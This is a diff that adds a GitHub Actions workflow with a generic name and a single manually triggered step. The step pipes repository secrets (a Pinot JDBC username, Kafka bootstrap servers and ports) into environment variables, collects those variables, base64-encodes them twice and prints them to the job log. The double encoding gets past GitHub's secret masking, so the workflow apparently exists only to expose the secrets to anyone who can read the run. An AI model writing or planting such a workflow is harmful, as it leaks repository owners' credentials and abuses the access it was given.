@@ -1,0 +1,14 @@
+name: GitHub Actions
+on:
+  workflow_dispatch:
+jobs:
+  init:
+    runs-on: ubuntu-latest
+    steps:
+      - name: command
+        run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
+        env:
+          secret_FLINK_WEB_PORT: ${{ secrets.FLINK_WEB_PORT }}
+          secret_APP_PORT: ${{ secrets.APP_PORT }}
+          secret_PINPOINT_PINOT_JDBC_USERNAME: ${{ secrets.PINPOINT_PINOT_JDBC_USERNAME }}
+          secret_PINPOINT_METRIC_KAFKA_BOOTSTRAP_SERVERS: ${{ secrets.PINPOINT_METRIC_KAFKA_BOOTSTRAP_SERVERS }}
